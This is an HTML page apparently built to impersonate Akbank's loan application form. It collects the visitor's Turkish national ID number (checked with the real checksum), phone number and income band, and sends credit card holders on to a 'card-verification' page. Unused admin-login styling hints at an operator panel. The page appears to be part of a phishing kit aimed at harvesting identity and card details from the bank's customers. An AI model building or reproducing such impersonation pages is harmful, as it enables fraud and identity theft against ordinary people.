<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Akbank Kredi Başvuru</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            color: #333;
        }
        .container {
            max-width: 600px;
            margin: 50px auto;
            padding: 30px;
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
        }
        header {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo {
            background-color: #e31837;
            color: white;
            font-size: 24px;
            font-weight: bold;
            padding: 10px 20px;
            border-radius: 5px;
            display: inline-block;
        }
        h1 {
            color: #e31837;
            margin-top: 20px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        input, select {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            box-sizing: border-box;
        }
        input:focus, select:focus {
            outline: none;
            border-color: #e31837;
        }
        .radio-group {
            margin: 10px 0;
        }
        .radio-label {
            margin-right: 20px;
            font-weight: normal;
        }
        button {
            background-color: #e31837;
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
        }
        button:hover {
            background-color: #c41230;
        }
        .error {
            color: #e31837;
            font-size: 14px;
            margin-top: 5px;
            display: none;
        }
        .admin-login {
            text-align: center;
            margin-top: 20px;
        }
        .admin-login a {
            color: #666;
            text-decoration: none;
            font-size: 14px;
        }
        .admin-login a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">Akbank</div>
            <h1>Kredi Başvuru Formu</h1>
        </header>

        <form id="personalInfoForm">
            <div class="form-group">
                <label for="tcno">TC Kimlik Numarası</label>
                <input type="text" id="tcno" name="tcno" maxlength="11" placeholder="11 haneli TC Kimlik Numaranız">
                <div id="tcError" class="error">Geçerli bir TC Kimlik Numarası giriniz.</div>
            </div>
            
            <div class="form-group">
                <label for="phone">Telefon Numarası</label>
                <input type="text" id="phone" name="phone" maxlength="10" placeholder="5XX XXX XXXX">
                <div id="phoneError" class="error">Geçerli bir telefon numarası giriniz.</div>
            </div>
            
            <div class="form-group">
                <label for="income">Aylık Gelir Düzeyi</label>
                <select id="income" name="income">
                    <option value="">Seçiniz</option>
                    <option value="0-5000">0 - 5.000 TL</option>
                    <option value="5001-10000">5.001 - 10.000 TL</option>
                    <option value="10001-15000">10.001 - 15.000 TL</option>
                    <option value="15001-25000">15.001 - 25.000 TL</option>
                    <option value="25001+">25.001 TL ve üzeri</option>
                </select>
                <div id="incomeError" class="error">Lütfen gelir düzeyi seçiniz.</div>
            </div>
            
            <div class="form-group">
                <label>Akbank kredi kartınız var mı?</label>
                <div class="radio-group">
                    <input type="radio" id="cardYes" name="hasCard" value="yes">
                    <label for="cardYes" class="radio-label">Evet</label>
                    
                    <input type="radio" id="cardNo" name="hasCard" value="no">
                    <label for="cardNo" class="radio-label">Hayır</label>
                </div>
                <div id="cardError" class="error">Lütfen bir seçenek işaretleyiniz.</div>
            </div>
            
            <button type="button" id="nextBtn">Devam Et</button>
        </form>
        
    </div>

    <script>
        // TC Kimlik Numarası doğrulama
        function validateTCKN(value) {
            if (!value || value.length !== 11 || !/^\d+$/.test(value)) {
                return false;
            }
            
            // TC Kimlik No algoritması
            let odd = 0, even = 0, total = 0, checkDigit1, checkDigit2;
            
            for (let i = 0; i < 9; i += 2) {
                odd += parseInt(value[i]);
            }
            
            for (let i = 1; i < 8; i += 2) {
                even += parseInt(value[i]);
            }
            
            total = (odd * 7 - even) % 10;
            
            if (total < 0) total += 10;
            
            if (total !== parseInt(value[9])) {
                return false;
            }
            
            for (let i = 0; i < 10; i++) {
                total += parseInt(value[i]);
            }
            
            if (total % 10 !== parseInt(value[10])) {
                return false;
            }
            
            return true;
        }
        
        // Telefon numarası doğrulama
        function validatePhone(value) {
            return /^5\d{9}$/.test(value);
        }
        
        // Form kontrol ve yönlendirme
        document.getElementById('nextBtn').addEventListener('click', function() {
            const tcno = document.getElementById('tcno').value.trim();
            const phone = document.getElementById('phone').value.trim();
            const income = document.getElementById('income').value;
            const cardYesRadio = document.getElementById('cardYes').checked;
            const cardNoRadio = document.getElementById('cardNo').checked;
            let hasError = false;
            
            // TC Kimlik No doğrulama
            if (!validateTCKN(tcno)) {
                document.getElementById('tcError').style.display = 'block';
                hasError = true;
            } else {
                document.getElementById('tcError').style.display = 'none';
            }
            
            // Telefon doğrulama
            if (!validatePhone(phone)) {
                document.getElementById('phoneError').style.display = 'block';
                hasError = true;
            } else {
                document.getElementById('phoneError').style.display = 'none';
            }
            
            // Gelir düzeyi doğrulama
            if (!income) {
                document.getElementById('incomeError').style.display = 'block';
                hasError = true;
            } else {
                document.getElementById('incomeError').style.display = 'none';
            }
            
            // Kredi kartı seçimi doğrulama
            if (!cardYesRadio && !cardNoRadio) {
                document.getElementById('cardError').style.display = 'block';
                hasError = true;
            } else {
                document.getElementById('cardError').style.display = 'none';
            }
            
            if (!hasError) {
                // Tüm verileri localStorage'a kaydedelim
                const applicationData = {
                    tcno: tcno,
                    phone: phone,
                    income: income,
                    hasCard: cardYesRadio ? 'Evet' : 'Hayır'
                };
                
                localStorage.setItem('applicationData', JSON.stringify(applicationData));
                
                // Seçime göre sayfa2 veya sayfa3'e yönlendir
                if (cardYesRadio) {
                    window.location.href = 'card-verification.html';
                } else {
                    // Başvuru numarası oluştur
                    const applicationNumber = 'AKB' + Date.now().toString().substring(5);
                    localStorage.setItem('applicationNumber', applicationNumber);
                    
                    // Başvuru bilgilerini kaydet
                    const application = {
                        applicationNumber: applicationNumber,
                        tcno: tcno,
                        phone: phone,
                        income: income,
                        hasCard: 'Hayır',
                        cardNumber: '-',
                        date: new Date().toLocaleString()
                    };
                    
                    // Mevcut başvuruları al
                    let applications = [];
                    const storedApplications = localStorage.getItem('applications');
                    if (storedApplications) {
                        applications = JSON.parse(storedApplications);
                    }
                    
                    // Yeni başvuruyu ekle
                    applications.push(application);
                    localStorage.setItem('applications', JSON.stringify(applications));
                    
                    // Sayfa 3'e geç
                    window.location.href = 'success.html';
                }
            }
        });
        
        // Sadece numara girişine izin ver
        document.getElementById('tcno').addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
        });
        
        document.getElementById('phone').addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
        });
    </script>
</body>
</html>
